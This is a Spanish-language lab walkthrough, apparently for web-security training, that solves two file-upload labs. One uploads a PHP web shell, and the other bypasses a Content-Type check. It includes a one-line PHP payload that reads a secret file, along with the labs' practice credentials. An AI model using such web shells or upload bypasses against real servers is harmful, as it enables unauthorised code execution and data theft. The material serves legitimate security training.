# File upload vulnerabilities

## Lab: Remote code execution via web shell upload

## Enunciado

Este laboratorio contiene una **función vulnerable de carga de imágenes**, que **no realiza ninguna validación** sobre los archivos que los usuarios suben antes de almacenarlos en el sistema de archivos del servidor. **Subir una web shell básica en PHP**, usarla para **extraer el contenido del archivo `/home/carlos/secret`**, y **enviar ese secreto** utilizando el botón provisto en el banner del laboratorio. Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:\
**Usuario:** `wiener`\
**Contraseña:** `peter`

## Resolución

Nos logueamos y vemos que podemos subir un archivo por lo que creamos una shell básica y la subimos.

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

<figure><img src="../../.gitbook/assets/image (1392).png" alt=""><figcaption></figcaption></figure>

Vemos la petición de donde está el archivo.

<figure><img src="../../.gitbook/assets/image (1393).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1394).png" alt=""><figcaption></figcaption></figure>

## Lab: Web shell upload via Content-Type restriction bypass

## Enunciado

Este laboratorio contiene una **función vulnerable de carga de imágenes**. Intenta evitar que los usuarios suban tipos de archivos no permitidos, pero **confía en datos que el propio usuario puede manipular** para hacer esa verificación. **Subir una web shell básica en PHP**, usarla para **extraer el contenido del archivo `/home/carlos/secret`**, y **enviar ese secreto** utilizando el botón del banner del laboratorio.

Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:\
**Usuario:** `wiener`\
**Contraseña:** `peter`

## Resolución

Nos logueamos y al intentar subir archivos podemos subir archivos con ciertas extensiones.

<figure><img src="../../.gitbook/assets/image (1395).png" alt=""><figcaption></figcaption></figure>

Vemos la petición.

<figure><img src="../../.gitbook/assets/image (1398).png" alt=""><figcaption></figcaption></figure>

Tal como dice el enunciado vamos a cambiarle el **Content-Type** por uno válido.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-24 225747.png" alt=""><figcaption></figcaption></figure>

Vemos la ruta donde se ha subido.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-24 225905.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1399).png" alt=""><figcaption></figcaption></figure>
